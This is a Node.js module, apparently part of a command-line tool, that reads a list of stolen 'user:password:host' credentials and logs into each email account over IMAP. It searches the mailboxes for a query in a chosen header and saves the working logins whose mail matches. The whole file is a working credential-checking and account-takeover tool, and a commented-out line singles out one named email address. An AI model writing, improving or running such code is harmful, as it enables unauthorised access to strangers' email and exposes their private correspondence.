const util = require('../../lib/util')
const contains = require('../../lib/contains')
const LineReader = require('line-by-line')
const Imap = require('imap')
const eachSeries = require('async-each-series')
const ora = require('ora')
const fs = require('fs')
const lineCount = require('../../lib/line_count')

function search(query, opts) {
  const { servers, emails, header, output } = opts

  const serverList = util.mapServers(servers)
  let matchingCount = 0
  let unmatchingCount = 0

  lineCount(emails).then(emailCount => {
    const spinner = ora(`0 matching, 0 checked, ${emailCount} total`).start()

    const lr = new LineReader(emails, {
      skipEmptyLines: true
    })
    lr.on('line', line => {
      lr.pause()
      const [ user, password, imapHost ] = line.split(':')
      if (!user || !password) {
        lr.resume()
        spinner.text = `${matchingCount} matching, ${++unmatchingCount + matchingCount} checked, ${emailCount} total`
        return
      }

      // if (user === 'fox.matt@mail.com') console.log('oh shet its him', user, password)
      let host = user.split('@')[1]
      if (imapHost) host = imapHost


      if (serverList.hasOwnProperty(host)) {
        const imapServer = serverList[host]

        const client = new Imap({
          user,
          password,
          host: imapServer.host,
          port: imapServer.port,
          tls: imapServer.tls
        })

        client.once('ready', () => {
          lr.resume()
          client.getBoxes((err, boxes) => {
            if (err) return console.log(err)

            boxes = Object.keys(boxes).filter(box => !box.includes('[Gmail]'))
            const results = []

            eachSeries(boxes, (box, next) => {
              contains(client, box, header, query)
              .then(containsQuery => {
                results.push(containsQuery)
                next()
              }).catch(console.log)
            }, () => {
              const matching = results.some(result => result)
              if (matching) {
                fs.appendFileSync(output, line + '\n')
                matchingCount++
              }

              unmatchingCount++

              spinner.text = `${matchingCount} matching, ${unmatchingCount + matchingCount} checked, ${emailCount} total`

              let total = matchingCount + unmatchingCount
              if (total === emailCount) {
                spinner.succeed(`Finished Checking, ${matchingCount} found matching query ${query} in ${header}`)
                process.exit()
              }
            })
          })
        })

        client.once('error', err => {
          client.destroy()
          lr.resume()

          const errors = [
            'timeout-auth',
            'authentication',
            'timeout',
            'read ECONNRESET'
          ]
          if (errors.includes(err.textCode) || errors.includes(err.source) || errors.includes(err.message)) {
            spinner.text = `${matchingCount} matching, ${++unmatchingCount + matchingCount} checked, ${emailCount} total`
          } else {
            console.log(err, line)
          }

        })
        client.once('end', () => lr.resume())
        client.once('close', () => lr.resume())
        client.connect()
      } else {
        lr.resume()
      }
    })
  })
}

module.exports = search
